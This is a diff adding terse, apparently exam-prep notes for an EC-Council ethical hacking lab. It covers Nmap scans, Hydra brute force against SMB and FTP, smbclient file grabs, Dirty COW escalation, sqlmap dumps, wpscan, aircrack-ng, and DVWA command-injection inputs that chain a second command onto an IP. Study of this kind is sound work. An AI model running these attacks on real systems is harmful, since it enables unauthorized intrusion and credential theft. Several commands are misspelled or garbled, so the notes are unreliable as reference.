@@ -1,0 +1,77 @@
+a. FQDN Commands.
+       Nmap -sS -sV -A -oN 192NET.txt 192.168.1.0/24
+       Nmap -sS -sV -A -oN 172NET.txt 172.16.0.1/24
+       Nmap -sS -sV -A -oN 10NET.txt 10.10.1.0/24
+b.Commands SMB: 
+       Hydra -l henry -P /home/attacker/Desktop/password.txt 192.168.1.1 smb -f
+       Hydra -l henry -P /home/attacker/Desktop/password.txt 192.168.1.1 smb -f
+       Smbclient -L \\IP -U henry    will list all directories.
+       //IP/$C
+       //IP/Users
+       Smbclient -u henry \\IP\Users\
+       ls
+       get sniff.txt
+       cat sniff.txt
+       python -m server.http---->
+
+c. Android Commands: 
+       Phonesploit
+       Scan folder location /sdcard/Notification/Scan/
+       4x file with .elf ext
+       Sh384  online
+       Match the pattern --->Format AnaA
+d.Commands to perform vulnerability scan score:
+* gvm-start on terminal --->will give ip. Pu it in browser--->will open openvasp
+* note IP from result and open into browser 
+* user OpenVAS credentials from notes provides by ECouncil 
+e. Commands for remote login and command-line execution:-
+* Ssh
+* Use hydra find user and password.
+
+
+f. Commands for steganography
+       Opensteg in windows >> use extract option and select MyTrip.jpg
+       Use imagi-- as password
+g. Commands for FTP service/ FTP root:
+       Hydra ftp://IP -l anonymous -e n
+       Hydra -L /home/attacker/username.txt -P /home/attacker/password.txt ftp:IP -f -V
+       ftp IP
+       enter username
+       enter password
+       ftp> ls
+h. Priv escalation: smith and L1nux123. Access the Machine, Perform vertical privilege escalation to that of a root user, and enter the content of the imroot.txt file as the answer.
+* Sudo -L   will tell what user can do.
+* Dirtycow – try room privilege escalation-kernal exploit
+i. Commandsfor malware analysis and find Entry point (Address):
+* Malware analysis---->DIE 
+* PEid
+J. Commands for SQL injection attack and find other user credentials:
+   Access website and search for any search tab / login page.
+* Use burpsuite to capture and 
+* Use sqlmap to dump database--->tables---->password.
+K. Procedure for Exploit the web application:
+* Website.com/wp-admin
+* OR use gobuster and find directory. -----> wp-admin.
+* Now explore browser and we have to enter login credentials.
+* Now, here we have to Use wpscan to enumerate user and passwords. Login and find pages.
+* Flag will be there.
+L. How to do vulnerability research and exploit the web application: 
+* Find login page, and 
+* Foxy proxy
+* sqlmap
+
+
+M. How to do SQL injection attack and find DB tables:.
+* Dvwa-low
+* Perform sqlmap
+
+N. for DVWA and finding files.
+* Goto cmd injection in dvwa----->and in [127.0.0.1;cd source/; cat Hash.txt] [127.0.0.1 & cd source & type high.php]
+* Just write \ hackable\uploads\ after http://172.20.0.16:8080/DVWA in browser. And copy hash.
+* Make new file and paste hash, now use hashcat to reveal the content.
+O. WIFI captured files;
+* Use Simple use aircrack-ng and cmd.
+P. For server access code and accessing that:
+       nj -RAt
+
+
